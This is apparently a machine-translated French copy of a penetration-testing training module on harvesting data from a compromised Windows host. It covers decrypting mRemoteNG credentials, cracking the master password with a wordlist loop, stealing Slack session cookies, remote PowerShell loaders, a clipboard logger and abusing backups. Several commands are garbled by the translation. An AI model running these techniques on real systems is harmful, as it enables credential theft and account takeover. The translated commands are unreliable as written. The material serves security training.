Pillage
=========

* * * * *

Le pillage est le processus d'obtention d'informations à partir d'un système compromis. Il peut s'agir d'informations personnelles, de plans d'entreprise, de données de carte de crédit, d'informations sur le serveur, de détails sur l'infrastructure et le réseau, de mots de passe ou d'autres types d'informations d'identification, et de tout ce qui concerne l'entreprise ou l'évaluation de sécurité sur laquelle nous travaillons.

Ces points de données peuvent aider à obtenir un accès supplémentaire au réseau ou à atteindre les objectifs définis lors du processus de pré-engagement du test d'intrusion. Ces données peuvent être stockées dans divers types d'applications, de services et d'appareils, dont l'extraction peut nécessiter des outils spécifiques.

* * * * *

Les sources de données
------------

Vous trouverez ci-dessous certaines des sources à partir desquelles nous pouvons obtenir des informations sur des systèmes compromis :

- Applications installées
- Services installés
     -   Sites Internet
     - Partages de fichiers
     - Bases de données
     - Services d'annuaire (tels que Active Directory, Azure AD, etc.)
     - Serveurs de noms
     - Services de déploiement
     -   Autorité de certification
     - Serveur de gestion de code source
     - Virtualisation
     -   Messagerie
     - Systèmes de surveillance et de journalisation
     - Sauvegardes
-   Données sensibles
     - Enregistrement de frappe
     -   Capture d'écran
     - Capture du trafic réseau
     - Rapports d'audit précédents
-   Informations de l'utilisateur
     - Fichiers historiques, documents intéressants (.doc/x,.xls/x,password.*/pass.*, etc)
     - Rôles et privilèges
     - Navigateurs Web
     - Clients de messagerie instantanée

Ce n'est pas une liste complète. Tout ce qui peut fournir des informations sur notre cible sera précieux. En fonction de la taille, de l'objectif et de la portée de l'entreprise, nous pouvons trouver des informations différentes. La connaissance et la familiarité avec les applications, les logiciels serveur et les intergiciels couramment utilisés sont essentielles, car la plupart des applications stockent leurs données dans divers formats et emplacements. Des outils spéciaux peuvent être nécessaires pour obtenir, extraire ou lire les données ciblées de certains systèmes.

Au cours des sections suivantes, nous discuterons et mettrons en pratique certains aspects du pillage dans Windows.

* * * * *

Scénario
--------

Supposons que nous ayons pris pied sur le serveur Windows mentionné dans le réseau ci-dessous et commençons à collecter autant d'informations que possible.

![](https://academy.hackthebox.com/storage/modules/67/network.png)

* * * * *

Applications installées
----------------------

Comprendre quelles applications sont installées sur notre système compromis peut nous aider à atteindre notre objectif lors d'un pentest. Il est important de savoir que chaque pentest est différent. Nous pouvons rencontrer de nombreuses applications inconnues sur les systèmes que nous avons compromis. Apprendre et comprendre comment ces applications se connectent à l'entreprise sont essentiels pour atteindre notre objectif.

Nous trouverons également des applications typiques telles qu'Office, des systèmes de gestion à distance, des clients de messagerie instantanée, etc. Nous pouvons utiliser `dir` ou `ls` pour vérifier le contenu de `Program Files` et `Program Files (x86)` pour trouver quelles applications sont installés. Bien qu'il puisse y avoir d'autres applications sur l'ordinateur, c'est un moyen rapide de les examiner.

#### Identification des applications courantes

Identification des applications courantes

```
C:\>répertoire "C:\Program Files"
  Le volume du lecteur C n'a pas d'étiquette.
  Le numéro de série du volume est 900E-A7ED

  Répertoire de C:\Program Files

14/07/2022 20h31 <DIR> .
14/07/2022 20:31 <DIR> ..
16/05/2022 15:57 <DIR> Adobe
16/05/2022 12:33 <DIR> Corsaire
16/05/2022 10h17 <DIR> Google
16/05/2022 11h07 <DIR> Microsoft Office 15
10/07/2022 11:30 <DIR> mRemoteENG
13/07/2022 09:14 <DIR> OpenVPN
19/07/2022 21:04 <DIR> Streamlabs OBS
20/07/2022 07:06 <DIR> TeamViewer
                0 Fichier(s) 0 octets
               16 Dir(s) 351 524 651 008 octets libres

```

Une alternative consiste à utiliser PowerShell et à lire le registre Windows pour collecter des informations plus précises sur les programmes installés.

#### Obtenez les programmes installés via PowerShell et les clés de registre

Obtenez les programmes installés via PowerShell et les clés de registre

```
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLÉ | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

Emplacement d'installation de la version d'affichage du nom d'affichage
----------- -------------- ---------------
Adobe Acrobat DC (64 bits) 22.001.20169 C:\Program Files\Adobe\Acrobat DC\
Logiciel CORSAIR iCUE 4 4.23.137 C:\Program Files\Corsair\Logiciel CORSAIR iCUE 4
Google Chrome 103.0.5060.134 C:\Program Files\Google\Chrome\Application
Google Drive 60.0.2.0 C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Professionnel Plus 2016 - es-es 16.0.15330.20264 C:\Program Files (x86)\Microsoft Office
Microsoft Office Professionnel Plus 2016 - fr-fr 16.0.15330.20264 C:\Program Files (x86)\Microsoft Office
mRemoteNG 1.62 C:\Program Files\mRemoteNG
TeamViewer 15.31.5 C:\Program Files\TeamViewer
...COUPER...

```

Nous pouvons voir que le logiciel `mRemoteNG` est installé sur le système. [mRemoteNG](https://mremoteng.org/) est un outil utilisé pour gérer et se connecter à des systèmes distants à l'aide de VNC, RDP, SSH et de protocoles similaires. Jetons un coup d'œil à `mRemoteNG`.

#### mRemoteNG

`mRemoteNG` enregistre les informations de connexion et les informations d'identification dans un fichier appelé `confCons.xml`. Ils utilisent un mot de passe principal codé en dur, `mR3m`, donc si quelqu'un commence à enregistrer les informations d'identification dans `mRemoteNG` et ne protège pas la configuration avec un mot de passe, nous pouvons accéder aux informations d'identification à partir du fichier de configuration et les déchiffrer.

Par défaut, le fichier de configuration se trouve dans `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

#### Découvrez les fichiers de configuration de mRemoteNG

Découvrir les fichiers de configuration mRemoteNG

```
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

     Répertoire : C:\Users\julio\AppData\Roaming\mRemoteNG

Mode LastWriteTime Longueur Nom
---- ------------- ------ ----
j----- 21/07/2022 08:51 Thèmes
-a---- 21/07/2022 08:51 340 confCons.xml
               21/07/2022 08:51 970 mRemoteNG.log

```

Examinons le contenu du fichier `confCons.xml` .

#### Fichier de configuration mRemoteNG - confCons.xml

Code : xml

```
<?XML version="1.0" encoding="utf-8" ?>
<mrng:Connexions xmlns:mrng="http://mremoteng.org" Name="Connexions" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected=" QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEDedcgDNO6N41Srqe" ConfVersion="2.6">
     <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrateur" Domain="test.local " Mot de passe="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Nom d'hôte="10.0.0.10" Protocole="RDP" PuttySession="Paramètres par défaut" Port="3389"
     ..COUPER..
</Connexions>

```

Ce document XML contient un élément racine appelé `Connections` avec les informations sur le chiffrement utilisé pour les informations d'identification et l'attribut `Protected`, qui correspond au mot de passe principal utilisé pour chiffrer le document. Nous pouvons utiliser cette chaîne pour tenter de déchiffrer le mot de passe principal. Nous trouverons des éléments nommés `Node` dans l'élément racine. Ces nœuds contiennent des détails sur le système distant, tels que le nom d'utilisateur, le domaine, le nom d'hôte, le protocole et le mot de passe. Tous les champs sont en clair sauf le mot de passe, qui est crypté avec le mot de passe principal.

Comme mentionné précédemment, si l'utilisateur n'a pas défini de mot de passe principal personnalisé, nous pouvons utiliser le script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) pour déchiffrer le mot de passe. Nous devons copier le contenu de l'attribut `Password` et l'utiliser avec l'option `-s`. S'il existe un mot de passe principal et que nous le connaissons, nous pouvons alors utiliser l'option `-p` avec le mot de passe principal personnalisé pour également déchiffrer le mot de passe.

#### Déchiffrer le mot de passe avec mremoteng_decrypt

Déchiffrer le mot de passe avec mremoteng_decrypt

```
dsgsec@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="

Mot de passe : ASDki230kasd09fk233aDA

```

Examinons maintenant un fichier de configuration chiffré avec un mot de passe personnalisé. Pour cet exemple, nous définissons le mot de passe personnalisé `admin`.

#### Fichier de configuration mRemoteNG - confCons.xml

Code : xml

```
<?XML version="1.0" encoding="utf-8" ?>
<mrng:Connexions xmlns:mrng="http://mremoteng.org" Name="Connexions" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected=" ConfVersion="2.6">
     <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrateur" Domain="test.local " Mot de passe="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Nom d'hôte="10.0.0.10" Protocole="RDP" PuttySession="Paramètres par défaut" Port="3389" ConnectTo Console="Faux"

<SNIP>
</Connexions>

```

Si nous tentons de déchiffrer l'attribut `Password` du nœud `RDP_Domain`, nous obtiendrons l'erreur suivante.

#### Tentative de déchiffrement du mot de passe avec un mot de passe personnalisé

Essayez to Décrypter le mot de passe avec un mot de passe personnalisé

```
dsgsec@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (dernier appel le plus récent) :
   Fichier "/home/plaintext/htb/academy/mremoteng_decrypt.py", ligne 49, dans <module>
     principal()
   Fichier "/home/plaintext/htb/academy/mremoteng_decrypt.py", ligne 45, dans main
     texte en clair = cipher.decrypt_and_verify (texte chiffré, balise)
   Fichier "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", ligne 567, dans decrypt_and_verify
     self.verify(received_mac_tag)
   Fichier "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", ligne 508, en vérification
     lever ValueError("La vérification MAC a échoué")
ValueError : Échec de la vérification MAC

```

Si nous utilisons le mot de passe personnalisé, nous pouvons le déchiffrer.

#### Décryptez le mot de passe avec mremoteng_decrypt et un mot de passe personnalisé

Décryptez le mot de passe avec mremoteng_decrypt et un mot de passe personnalisé

```
dsgsec@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA ==" -p

Mot de passe : ASDki230kasd09fk233aDA

```

Au cas où nous voudrions essayer de casser le mot de passe, nous pouvons modifier le script pour essayer plusieurs mots de passe à partir d'un fichier, ou nous pouvons créer une "boucle for" Bash. Nous pouvons tenter de déchiffrer l'attribut `Protected` ou le `Password` lui-même. Si nous essayons de déchiffrer l'attribut `Protected` une fois que nous avons trouvé le mot de passe correct, le résultat sera `Password : ThisIsProtected`. Si nous essayons de déchiffrer le `Password` directement, le résultat sera `Password : <PASSWORD>`.

#### For Loop pour déchiffrer le mot de passe principal avec mremoteng_decrypt

For Loop pour cracker le mot de passe principal avec mremoteng_decrypt

```
dsgsec@htb[/htb]$ pour le mot de passe dans $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $mot de passe 2>/dev/null;done

Printemps 2017
Printemps 2016
administrateur
Mot de passe : ASDki230kasd09fk233aDA
administrateur administrateur
administrateurs

<SNIP>

```

* * * * *

Abus de cookies pour accéder aux clients de messagerie instantanée
------------------------------------------------

Avec la possibilité d'envoyer instantanément des messages entre collègues et équipes, les applications de messagerie instantanée (IM) comme `Slack` et `Microsoft Teams` sont devenues des incontournables des communications bureautiques modernes. Ces applications aident à améliorer la collaboration entre les collègues et les équipes. Si nous compromettons un compte d'utilisateur et accédons à un client de messagerie instantanée, nous pouvons rechercher des informations dans des discussions et des groupes privés.

Il existe plusieurs options pour accéder à un client de messagerie instantanée ; une méthode standard consiste à utiliser les informations d'identification de l'utilisateur pour accéder à la version cloud de l'application de messagerie instantanée comme le ferait l'utilisateur ordinaire.

Si l'utilisateur utilise une forme quelconque d'authentification multifacteur, ou si nous ne pouvons pas obtenir les informations d'identification en clair de l'utilisateur, nous pouvons essayer de voler les cookies de l'utilisateur pour se connecter au client basé sur le cloud.

Il existe souvent des outils qui peuvent nous aider à automatiser le processus, mais comme le cloud et les applications évoluent constamment, nous pouvons trouver ces applications obsolètes et nous devons toujours trouver un moyen de collecter des informations auprès des clients de messagerie instantanée. Comprendre comment abuser des informations d'identification, des cookies et des jetons est souvent utile pour accéder aux applications Web telles que les clients de messagerie instantanée.

Prenons `Slack` comme exemple. Plusieurs messages font référence à la façon d'abuser de `Slack` comme [Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) et [Phishing for Slack-tokens] (https://thomfre.dev/post/2021/phishing-for-slack-tokens/). Nous pouvons les utiliser pour mieux comprendre le fonctionnement des jetons et des cookies Slack, mais gardez à l'esprit que le comportement de "Slack" peut avoir changé depuis la publication de ces messages.

Il existe également un outil appelé [SlackExtract](https://github.com/clr2of8/SlackExtract) sorti en 2018, capable d'extraire les messages `Slack`. Leurs recherches portent sur le cookie nommé `d`, que `Slack` utilise pour stocker le jeton d'authentification de l'utilisateur. Si nous pouvons mettre la main sur ce cookie, nous pourrons nous authentifier en tant qu'utilisateur. Au lieu d'utiliser l'outil, nous tenterons d'obtenir le cookie de Firefox ou d'un navigateur basé sur Chromium et de nous authentifier en tant qu'utilisateur.

##### Extraction de cookies depuis Firefox

Firefox enregistre les cookies dans une base de données SQLite dans un fichier nommé `cookies.sqlite`. Ce fichier se trouve dans le répertoire APPDATA de chaque utilisateur `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. Une partie du fichier est aléatoire et nous pouvons utiliser un caractère générique dans PowerShell pour copier le contenu du fichier.

#### Copier la base de données des cookies de Firefox

Copier la base de données des cookies de Firefox

```
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

```

Nous pouvons copier le fichier sur notre machine et utiliser le script Python [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) pour extraire les cookies duCookies Firefox.Base de données SQLite.

#### Extraire le cookie Slack de la base de données de cookies de Firefox

Extraire le cookie Slack de la base de données de cookies de Firefox

```
dsgsec@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1 sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 16584394 20528000, 1 , 1, 0, 1, 1, 2)

```

Maintenant que nous avons le cookie, nous pouvons utiliser n'importe quelle extension de navigateur pour ajouter le cookie à notre navigateur. Pour cet exemple, nous utiliserons Firefox et l'extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Assurez-vous d'installer l'extension en cliquant sur le lien, en sélectionnant votre navigateur et en ajoutant l'extension. Une fois l'extension installée, vous verrez quelque chose comme ceci :

![texte](https://academy.hackthebox.com/storage/modules/67/cookie-editor-extension.jpg)

Notre site Web cible est `slack.com`. Maintenant que nous avons le cookie, nous voulons usurper l'identité de l'utilisateur. Naviguons vers slack.com une fois la page chargée, cliquez sur l'icône de l'extension Cookie-Editor et modifiez la valeur du `d` cookie avec la valeur que vous avez du script cookieextractor.py. Assurez-vous de cliquer sur l'icône de sauvegarde (marquée en rouge dans l'image ci-dessous).

![texte](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

Une fois que vous avez enregistré le cookie, vous pouvez actualiser la page et voir que vous êtes connecté en tant qu'utilisateur.

![texte](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

Nous sommes maintenant connectés en tant qu'utilisateur et pouvons cliquer sur `Lancer Slack`. Nous pouvons recevoir une invite pour les informations d'identification ou d'autres types d'informations d'authentification ; nous pouvons répéter le processus ci-dessus et remplacer le cookie `d` par la même valeur que celle que nous avons utilisée pour accéder la première fois à tout site Web qui nous demande des informations ou des informations d'identification.

![texte](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

Une fois que nous avons terminé ce processus pour chaque site Web sur lequel nous recevons une invite, nous devons actualiser le navigateur, cliquer sur `Lancer Slack` et utiliser Slack dans le navigateur.

Après avoir obtenu l'accès, nous pouvons utiliser des fonctions intégrées pour rechercher des mots courants tels que des mots de passe, des informations d'identification, des PII ou toute autre information pertinente pour notre évaluation.

![texte](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)

##### Extraction de cookies à partir de navigateurs basés sur Chromium

Le navigateur à base de chrome stocke également ses informations de cookies dans une base de données SQLite. La seule différence est que la valeur du cookie est chiffrée avec l'[API de protection des données (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) . `DPAPI` est couramment utilisé pour chiffrer des données à l'aide d'informations provenant du compte d'utilisateur ou de l'ordinateur actuel.

Pour obtenir la valeur du cookie, nous devrons effectuer une routine de déchiffrement à partir de la session de l'utilisateur que nous avons compromis. Heureusement, un outil [SharpChromium](https://github.com/djhohnstein/SharpChromium) fait ce dont nous avons besoin. Il se connecte à la base de données de cookies SQLite de l'utilisateur actuel, décrypte la valeur du cookie et présente le résultat au format JSON.

Utilisons [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), un script PowerShell créé par [S3cur3Th1sSh1t](https://twitter.com/ ShitSecure) qui utilise la réflexion pour charger SharpChromium.

#### Script PowerShell - Invoke-SharpChromium

Script PowerShell - Invoke-SharpChromium

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.

```

Une erreur s'est produite, car le chemin du fichier de cookie contenant la base de données est codé en dur dans [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), et la version actuelle de Chrome utilise un endroit différent.

Nous pouvons modifier le code de `SharpChromium` ou copier le fichier cookie à l'endroit où SharpChromium recherche.

`SharpChromium` recherche un fichier dans `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, mais le fichier réel se trouve dans `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` avec la commande suivante, nous copierons le fichier à l'emplacement attendu par SharpChromium.

#### Copier les cookies vers l'emplacement attendu de SharpChromium

Copier les cookies vers l'emplacement attendu de SharpChromium

```
PS C:\htb> copier "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

```

Nous pouvons maintenant utiliser à nouveau Invoke-SharpChromium pour obtenir une liste de cookies au format JSON.

#### Extraction des cookies Invoke-SharpChromium

Extraction de cookies Invoke-SharpChromium

```
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

Nous pouvons maintenant utiliser ce cookie avec cookie-editor comme nous l'avons fait avec Firefox.

Remarque : Lorsque vous copiez/collez le contenu d'un cookie, assurez-vous que la valeur est d'une ligne.

* * * * *

Presse-papiers
---------

Dans de nombreuses entreprises, les administrateurs réseau utilisent des gestionnaires de mots de passe pour stocker leurs informations d'identification et copier et coller les mots de passe dans les formulaires de connexion. Comme cela n'implique pas `taper` les mots de passe, la journalisation des frappes n'est pas efficace dans ce cas. Le `presse-papiers` donne accès à une quantité importante d'informations, telles que le collage d'informations d'identification et de jetons logiciels 2FA, ainsi que la possibilité d'interagir directement avec le presse-papiers de la session RDP.

Nous pouvons utiliser le script [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) pour extraire les données du presse-papiers de l'utilisateur. Démarrez l'enregistreur en exécutant la commande ci-dessous.

#### Surveiller le presse-papiers avec PowerShell

Surveiller le presse-papiers avec PowerShell

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger

```

Le script commencera à surveiller les entrées dans le presse-papiers et les présentera dans la session PowerShell. Nous devons être patients et attendre de capturer des informations sensibles.

#### Capturer les informations d'identification du presse-papiers avec Invoke-ClipboardLogger

Capturer les informations d'identification du presse-papiers avec Invoke-ClipboardLogger

```
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk

```

Remarque : Les informations d'identification de l'utilisateur peuvent être obtenues avec des outils tels que Mimikatz ou un enregistreur de frappe. Les frameworks C2 tels que Metasploit contiennent des fonctions intégrées pour l'enregistrement des frappes.

* * * * *

Rôles et services
------------------

Les services sur un hôte particulier peuvent servir l'hôte lui-même ou d'autres hôtes sur le réseau cible. Il est nécessaire de créer un profil de chaque hôte ciblé, en documentant la configuration de ces services, leur objectif et la manière dont nous pouvons potentiellement les utiliser pour atteindre nos objectifs d'évaluation. Les rôles et services de serveur typiques incluent :

- Serveurs de fichiers et d'impression
- Serveurs Web et de base de données
- Serveurs d'autorité de certification
- Serveurs de gestion de code source
- Serveurs de sauvegarde

Prenons `Serveurs de sauvegarde` comme exemple, et comment, si nous compromettons un serveur ou un hôte avec un système de sauvegarde, nous pouvons compromettre le réseau.

#### Attaquer les serveurs de sauvegarde

Dans les technologies de l'information, une `sauvegarde` ou `sauvegarde de données` est une copie de données informatiques prises et stockées ailleurs afin qu'elles puissent être utilisées pour restaurer l'original après un événement de perte de données. Les sauvegardes peuvent être utilisées pour récupérer des données après une perte due à la suppression ou à la corruption de données ou pour récupérer des données antérieures. Les sauvegardes offrent une forme simple de récupération après sinistre. Certains systèmes de sauvegarde peuvent reconstituer un système informatique ou d'autres configurations complexes, comme un serveur Active Directory ou un serveur de base de données.

Généralement, les systèmes de sauvegarde ont besoin d'un compte pour se connecter à la machine cible et effectuer la sauvegarde. La plupart des entreprises exigent que les comptes de sauvegarde disposent de privilèges administratifs locaux sur la machine cible pour accéder à tous ses fichiers et services.

Si nous accédons à un `système de sauvegarde`, nous pourrons peut-être examiner les sauvegardes, rechercher des hôtes intéressants et restaurer les données souhaitées.

Comme nous en avons discuté précédemment, nous recherchons des informations qui peuvent nous aider à nous déplacer latéralement dans le réseau ou à augmenter nos privilèges. Prenons [restic](https://restic.net/) comme exemple. `Restic` est un programme de sauvegarde modernequi peut sauvegarder des fichiers sous Linux, BSD, Mac et Windows.

Pour commencer à travailler avec `restic`, nous devons créer un `repository` (le répertoire dans lequel les sauvegardes seront stockées). `Restic` vérifie si la variable d'environnement `RESTIC_PASSWORD` est définie et utilise son contenu comme mot de passe pour le référentiel. Si cette variable n'est pas définie, elle demandera le mot de passe pour initialiser le référentiel et pour toute autre opération dans ce référentiel.

Nous allons utiliser `restic 0.13.1` et sauvegarder le référentiel `C:\xampp\htdocs\webapp` dans `E:\restic\` répertoire. Pour télécharger la dernière version de restic, rendez-vous sur <https://github.com/restic/restic/releases/latest>. Sur notre machine cible, restic se trouve dans `C:\Windows\System32\restic.exe`.

Nous devons d'abord créer et initialiser l'emplacement où notre sauvegarde sera enregistrée, appelé `dépôt`.

#### restic - Initialiser le répertoire de sauvegarde

restic - Initialiser le répertoire de sauvegarde

```
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Ensuite, nous pouvons créer notre première sauvegarde.

#### restic - Sauvegarder un répertoire

restic - Sauvegarder un répertoire

```
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved

```

Si nous voulons sauvegarder un répertoire tel que `C:\Windows`, qui contient des fichiers activement utilisés par le système d'exploitation, nous pouvons utiliser l'option `--use-fs-snapshot` pour créer un VSS (Volume Shadow Copy ) pour effectuer la sauvegarde.

#### restic - Sauvegarder un répertoire avec VSS

restic - Sauvegarder un répertoire avec VSS

```
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read

```

Remarque : Si l'utilisateur ne dispose pas des droits d'accès ou de copie du contenu d'un répertoire, nous pouvons recevoir un message d'accès refusé. La sauvegarde sera créée, mais aucun contenu ne sera trouvé.

Nous pouvons également vérifier quelles sauvegardes sont enregistrées dans le référentiel à l'aide de la commande `shapshot` .

#### restic - Vérifier les sauvegardes enregistrées dans un référentiel

restic - Vérifier les sauvegardes enregistrées dans un référentiel

```
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

Nous pouvons restaurer une sauvegarde en utilisant l'ID.

#### restic - Restaurer une sauvegarde avec ID

restic - Restaurer une sauvegarde avec ID

```
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

dépôt fdb2e6dd ouvert avec succès, le mot de passe est correct
restauration <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore

```

Si nous naviguons vers `C:\Restore`, nous trouverons la structure du répertoire où la sauvegarde a été effectuée. Pour accéder au répertoire `SampleFolder` , nous devons accéder à `C:\Restore\C\SampleFolder`.

Nous devons comprendre nos cibles et le type d'informations que nous recherchons. Si nous trouvons une sauvegarde pour une machine Linux, nous pouvons vouloir vérifier des fichiers comme `/etc/shadow` pour déchiffrer les informations d'identification des utilisateurs, les fichiers de configuration Web, les répertoires `.ssh` pour rechercher des clés SSH, etc.

